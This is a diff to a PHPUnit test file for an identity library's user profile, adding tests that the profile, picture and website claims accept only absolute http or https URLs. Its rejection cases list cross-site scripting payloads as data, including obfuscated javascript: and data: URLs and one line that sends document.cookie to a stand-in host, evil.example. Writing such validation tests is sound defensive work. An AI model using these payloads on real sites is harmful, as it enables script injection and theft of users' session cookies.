@@ -7,6 +7,7 @@ namespace Beffroi\Core\Tests\Domain\Identity;
 use Beffroi\Core\Domain\Identity\Profile;
 use Beffroi\Core\Exception\InvalidArgumentException;
 use function array_keys;
+use function in_array;
 use PHPUnit\Framework\Attributes\DataProvider;
 use PHPUnit\Framework\Attributes\Test;
 use PHPUnit\Framework\TestCase;
@@ -199,6 +200,12 @@ final class ProfileTest extends TestCase
             ],
             'Unknown named parameter $email',
         ];
+        yield 'a website the object refuses' => [
+            [
+                'websiteUrl' => 'javascript:alert(1)',
+            ],
+            'The website "javascript:alert(1)" must be an absolute https or http URL (OIDC Core section 5.1).',
+        ];
         yield 'a birthdate the object refuses' => [
             [
                 'birthdate' => '21/05/1990',
@@ -227,25 +234,91 @@ final class ProfileTest extends TestCase
 
     #[Test]
     #[DataProvider('provideClaimNames')]
-    public function aClaimSaidByItsNameIsReadBackUnderIt(string $claim): void
+    public function aClaimSaidByItsNameIsReadBackUnderIt(string $claim, string $value): void
     {
         // When
         $said = Profile::empty()->describedWith([
-            $claim => '2001',
+            $claim => $value,
         ]);
 
         // Then
-        static::assertSame('2001', $said->claims()[$claim]);
+        static::assertSame($value, $said->claims()[$claim]);
     }
 
     /**
-     * @return iterable<string, array{string}>
+     * @return iterable<string, array{string, string}>
      */
     public static function provideClaimNames(): iterable
     {
         foreach (array_keys(Profile::empty()->claims()) as $claim) {
-            yield $claim => [$claim];
+            yield $claim => [$claim, in_array($claim, ['profile', 'picture', 'website'], true) ? 'https://2001.example/' : '2001'];
         }
+    }
+
+    /**
+     * OIDC Core §5.1
+     */
+    #[Test]
+    #[DataProvider('provideWebAddresses')]
+    public function aUrlClaimHoldsAnAbsoluteWebAddress(string $claim, string $url): void
+    {
+        // When
+        $said = Profile::empty()->describedWith([
+            $claim => $url,
+        ]);
+
+        // Then
+        static::assertSame($url, $said->claims()[$claim]);
+    }
+
+    /**
+     * @return iterable<string, array{string, string}>
+     */
+    public static function provideWebAddresses(): iterable
+    {
+        yield 'a profile page over https' => ['profile', 'https://social.example/ada'];
+        yield 'a picture over http' => ['picture', 'http://images.example/ada.png?size=64'];
+        yield 'a website on a port' => ['website', 'https://ada.example:8443/'];
+        yield 'a website whose scheme is in capitals' => ['website', 'HTTPS://ada.example'];
+        yield 'a website on an IPv6 address' => ['website', 'https://[2001:db8::1]/'];
+    }
+
+    /**
+     * OIDC Core §5.1
+     */
+    #[Test]
+    #[DataProvider('provideAddressesThatAreNoWebPage')]
+    public function aUrlClaimRefusesWhatIsNoAbsoluteWebAddress(string $claim, string $url): void
+    {
+        // Then
+        $this->expectException(InvalidArgumentException::class);
+        $this->expectExceptionMessageIs(sprintf('The %s "%s" must be an absolute https or http URL (OIDC Core section 5.1).', $claim, $url));
+
+        // When
+        Profile::empty()->describedWith([
+            $claim => $url,
+        ]);
+    }
+
+    /**
+     * @return iterable<string, array{string, string}>
+     */
+    public static function provideAddressesThatAreNoWebPage(): iterable
+    {
+        yield 'a script as the website' => ['website', 'javascript:fetch(`//evil.example/?c=`+document.cookie)'];
+        yield 'a script as the profile page' => ['profile', 'javascript:alert(1)'];
+        yield 'a script as the picture' => ['picture', 'javascript:alert(1)'];
+        yield 'a document carried in the URL' => ['profile', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='];
+        yield 'an image carried in the URL' => ['picture', 'data:image/svg+xml,<svg onload=alert(1)>'];
+        yield 'a script in capitals' => ['website', 'JavaScript:alert(1)'];
+        yield 'a script behind a space' => ['website', ' javascript:alert(1)'];
+        yield 'a script whose scheme a tab splits' => ['website', "java\tscript:alert(1)"];
+        yield 'a web scheme with no host' => ['website', 'https:javascript:alert(1)'];
+        yield 'a web scheme with an empty host' => ['website', 'https:///ada'];
+        yield 'a relative reference' => ['website', '/ada'];
+        yield 'a host with no scheme' => ['website', 'ada.example'];
+        yield 'another scheme' => ['website', 'ftp://ada.example/'];
+        yield 'a line feed behind an address that would pass' => ['website', "https://ada.example\n"];
     }
 
     #[Test]
